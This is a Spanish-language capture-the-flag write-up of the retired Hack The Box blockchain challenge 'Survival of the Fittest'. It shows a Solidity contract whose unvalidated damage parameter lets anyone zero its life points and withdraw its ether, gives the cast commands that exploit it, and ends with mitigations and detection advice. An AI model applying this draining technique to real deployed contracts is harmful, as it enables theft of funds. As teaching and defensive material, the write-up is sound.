---
challenge: Survival of the Fittest
category: Challenge
type: Blockchain
os: Linux
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [blockchain, solidity, smart-contract, foundry, cast]
---

# Survival of the Fittest — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Contrato `Creature` con 20 puntos de vida y una única comprobación: `loot()` paga el saldo solo si `lifePoints == 0`. `strongAttack()` resta el daño que le pases sin límite ni validación, así que una sola llamada con 20 deja la condición lista y la siguiente retira el ether. No hay reentrancy ni matemática: es una comprobación de estado que el propio contrato permite satisfacer.

## Enunciado y superficie

- Categoría **Blockchain**, dificultad **Very Easy** (10 puntos).
- Entrega `Setup.sol` y `Creature.sol`; la instancia da RPC, clave privada del jugador y dirección del contrato.
- El objetivo es vaciar el contrato desplegado con 1 ether.

```bash
cat Setup.sol Creature.sol
```

## Reconocimiento

```solidity
contract Creature {
    uint256 public lifePoints = 20;
    function strongAttack(uint256 _damage) external { lifePoints -= _damage; }
    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

- `strongAttack` es `external` y sin control de acceso: cualquiera puede llamarla.
- No hay `require(_damage <= lifePoints)`, así que el valor lo elige el atacante.
- `loot` no comprueba si ya se ha retirado: el saldo es la única condición.

## Análisis del código

El estado útil es un `uint256` público. `Setup.sol` despliega `Creature` con 1 ether y define `isSolved()` como `address(creature).balance == 0`, que es exactamente lo que hace `loot()`.

No hay `fallback`, ni `delegatecall`, ni bucles: el fallo es de lógica, no de EVM.

## Explicación del fallo

El contrato asume que llegar a 0 requiere muchos ataques y que el daño será pequeño. Al aceptar cualquier `uint256`, basta enviar 20 en una llamada; con `lifePoints` a 0, `loot()` pasa el `require` y transfiere el saldo.

```text
estado inicial: lifePoints = 20, balance = 1 ether
strongAttack(20) -> lifePoints = 0
loot() -> require pasa, transfer(1 ether)
```

## Reproducción local

```bash
anvil
forge create Creature --rpc-url http://127.0.0.1:8545 --private-key <PK>
cast call <CREATURE> "lifePoints()(uint256)" --rpc-url http://127.0.0.1:8545
```

## Explotación

```bash
cast send <CREATURE> "strongAttack(uint256)" 20 --rpc-url <RPC> --private-key <PK>
cast send <CREATURE> "loot()" --rpc-url <RPC> --private-key <PK>
cast balance <CREATURE> --rpc-url <RPC>
```

Con el saldo a cero, la instancia entrega la flag en `http://<IP>:<PORT>/flag`.

## Evidencia

- `lifePoints()` antes y después de `strongAttack(20)`.
- `cast balance` del contrato en 0 tras `loot()`.
- Sin la flag real en la ficha.

## Lecciones aprendidas

- Un contrato pequeño sigue teniendo superficie: la validación de entrada es parte del diseño.
- Las funciones `external` sin modificador son públicas para cualquiera, incluido el atacante.
- Comprobar el saldo como condición de victoria es habitual en retos, pero en producción hay que evitar pagos basados en estado manipulable.
- Antes de escribir un exploit conviene leer `Setup.sol`: define exactamente qué se considera resuelto.

## Mitigaciones y detección

- Validar el daño (`require(_damage <= lifePoints)`) y limitar el número de ataques por bloque o por dirección.
- Separar la lógica de recompensa del estado que el usuario puede modificar.
- En un contrato real, usar patrones de retirada con contabilidad interna y eventos.
- Detección: llamadas repetidas a la misma función en un bloque, transferencias que vacían el saldo y eventos con daños anómalos.
- Referencias: SWC-105 (unprotected ether withdrawal), MITRE T1190.

## Referencias

- <https://www.hackthebox.com/challenges/survival-of-the-fittest>
- <https://coinsbench.com/survival-of-the-fittest-writeup-htb-f31d274b119b>
- <https://www.agalera.eu/docs/write-up/htb/challenges/survival-of-the-fittest>
- <https://docs.soliditylang.org/en/latest/security-considerations.html>
